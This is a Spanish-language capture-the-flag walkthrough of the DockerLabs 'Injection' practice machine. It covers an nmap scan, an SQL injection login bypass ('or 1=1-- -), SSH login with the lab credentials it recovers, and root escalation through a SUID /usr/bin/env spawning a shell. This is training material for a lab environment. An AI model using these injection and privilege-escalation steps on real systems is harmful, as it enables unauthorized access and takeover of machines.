# 🖥️ Máquina Injection
- 🔓 Dificultad: **muy fácil**

## 🔌 Comprobamos la conexión:
Primero comprobaremos si tenemos conexión con la máquina Injection:

```bash
ping -c 3 172.17.0.2
```

Este comando enviará solo 3 paquetes ping a la dirección IP designada (172.17.0.2) y luego terminará.

---

## 🔍 Escaneo con Nmap
Ahora haremos un escaneo de puertos con la herramienta 🛠️ Nmap:

```bash
sudo nmap -p- -sS -sC --open -sV --min-rate=5000 -n -vvv -Pn 172.17.0.2 -oN /home/kali/Escritorio/dockerlabs_maquinas/maquinas_muy_faciles/maquina_injection_muyfacil/escaneo_maquina_inyection 
```

🔎 **Explicación de los parámetros del comando:**

- `-p-` Escanea **todos los 65535 puertos TCP**
- `-sS`  Escaneo **SYN sigiloso**
- `-sC` Usa **scripts por defecto**
- `--open` Muestra **solo puertos abiertos**
- `-sV` Detecta la **versión de los servicios**
- `--min-rate=5000` Velocidad mínima de **5000 paquetes/s**
- `-n` Sin resolución DNS
- `-vvv` Modo muy detallado
- `-Pn` Sin ping al host antes de escanear
- `-oN` Guarda el resultado en la ruta especificada

---

## 📊 Resultado del escaneo

```
Host is up, received arp-response (0.0000080s latency).
Scanned at 2025-05-15 21:58:36 EDT for 7s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.52 ((Ubuntu))
...
```

Observamos que los puertos **22 (SSH)** y **80 (HTTP)** están abiertos.

---

## 🌐 Acceso Web

Colocamos la dirección IP `172.17.0.2` en el navegador 🌍. Nos pedirá usuario y contraseña:

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/injection%201.png)

---

## 🧨 Ataque de inyección SQL

Probamos un ataque de **inyección SQL**:

```sql
'or 1=1-- - 
```

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/injection%202.png)

🔐 Obtuvimos credenciales:

```
user : dylan
contraseña: KJSDFG789FGSDF78
```

![captura-login](https://raw.githubusercontent.com/m4zpan1/DockerLabs_Resolutions/refs/heads/main/injection%203.png)

---

## 🔐 Conexión SSH

Probamos conectarnos vía SSH:

```bash
ssh dylan@172.17.0.2
# contraseña: KJSDFG789FGSDF78
```

---

# 🧗 Escala de Privilegios

Buscamos binarios con permisos SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

📄 Resultado:

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
...
/usr/bin/env
...
```

📌 El binario `/usr/bin/env` tiene permisos SUID, lo que puede permitir una **escalada de privilegios**.

---

## 🔓 Escalada usando `env`

```bash
./env /bin/sh -p
```

⚠️ Si aparece el error:

```
-bash: ./env: No such file or directory
```

🔧 La solución es ejecutar el comando desde el directorio correcto:

```bash
cd /usr/bin
./env /bin/sh -p
# whoami
root
```
